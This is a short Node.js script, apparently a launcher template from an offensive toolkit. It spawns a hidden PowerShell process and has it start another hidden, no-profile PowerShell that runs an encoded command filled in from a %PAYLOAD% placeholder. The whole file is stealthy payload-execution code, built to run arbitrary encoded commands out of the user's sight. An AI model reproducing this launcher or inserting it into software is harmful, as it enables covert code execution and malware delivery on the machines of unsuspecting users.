var spawn = require('child_process').spawn;
var child = spawn('powershell',[], {detach: true, windowsHide: true });
child.stdin.setEncoding('utf-8');
child.stdin.write("start-process powershell -WindowStyle Minimized -ArgumentList \"-Sta\", \"-Nop\", \"-Window Hidden\", \"-EncodedCommand %PAYLOAD%\" \n");
child.stdin.end();
